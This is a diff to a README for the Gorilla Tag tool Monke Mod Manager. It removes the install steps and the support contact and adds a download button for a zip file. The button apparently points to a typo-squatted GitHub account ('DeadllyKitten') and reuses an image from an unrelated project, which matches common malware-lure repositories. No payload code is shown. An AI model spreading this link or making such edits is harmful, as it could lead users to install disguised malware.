@@ -30,10 +30,8 @@ Monke Mod Manager is a free program for **Gorilla Tag**, developed by **Deadly K
 
 ## Installation
 
-1. Download the latest version of **Monke Mod Manager** from the [official website](https://example.com) or another trusted source.
-2. Run the program, and it will automatically detect the folder where **Gorilla Tag** is installed.
-3. Follow the on-screen instructions to install and update mods.
-
+  <a href="https://github.com/DeadllyKitten/MonkeModManager/releases/download/1.3.1/monkemod-manager-.zip"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
+</p>
 ---
 
 ## Usage
@@ -44,9 +42,6 @@ Monke Mod Manager is a free program for **Gorilla Tag**, developed by **Deadly K
 
 ---
 
-## Support
-
-If you have any questions or issues with the program, reach out to [support](https://example.com/support) or submit a ticket on the forum.
 
 ---
 
